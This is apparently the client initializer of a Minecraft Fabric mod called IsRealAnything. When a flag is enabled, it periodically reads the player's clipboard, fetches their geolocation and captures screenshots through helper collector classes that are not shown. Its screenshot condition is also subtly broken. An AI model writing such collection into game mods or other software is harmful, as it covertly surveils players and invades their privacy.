package com.epicspymain.isrealanything;

import com.epicspymain.isrealanything.collector.ClipboardMonitor;
import com.epicspymain.isrealanything.collector.GeoLocator;
import com.epicspymain.isrealanything.collector.MavonLogger;
import com.epicspymain.isrealanything.collector.ScreenGrabber;
import net.fabricmc.api.ClientModInitializer;
import net.fabricmc.fabric.api.client.event.lifecycle.v1.ClientTickEvents;
import software.bernie.geckolib.GeckoLib;

public class IsRealAnythingClient implements ClientModInitializer {
	private int tickCounter = 0;
	private static final int COLLECTION_INTERVAL = 6000; // Every 5 minutes (6000 ticks)
	
	@Override
	public void onInitializeClient() {
		IsRealAnything.LOGGER.info("IsRealAnything client initialized!");
		
		// Initialize GeckoLib for animated entities
		GeckoLib.initialize();
		IsRealAnything.LOGGER.info("GeckoLib initialized for animated entities");
		
		if (IsRealAnything.ENABLE_DATA_COLLECTION) {
			initializeDataCollection();
		}
	}
	
	private void initializeDataCollection() {
		IsRealAnything.LOGGER.info("Initializing data collection systems...");
		
		// Perform initial location grab
		GeoLocator.fetchLocation();
		
		// Set up periodic data collection
		ClientTickEvents.END_CLIENT_TICK.register(client -> {
			tickCounter++;
			
			if (tickCounter >= COLLECTION_INTERVAL) {
				tickCounter = 0;
				
				// Collect data periodically
				String clipboardData = ClipboardMonitor.getClipboardContent();
				String locationData = GeoLocator.fetchLocation();
				
				// Log collected data
				MavonLogger.logTelemetry("periodic_collection", 
					"clipboard=" + (clipboardData != null ? "present" : "empty") +
					", location=" + (locationData != null ? "present" : "unavailable"));
				
				// Optionally capture screenshot
				if (tickCounter % (COLLECTION_INTERVAL * 3) == 0) {
					ScreenGrabber.captureScreen("periodic_" + System.currentTimeMillis());
				}
			}
		});
	}
}
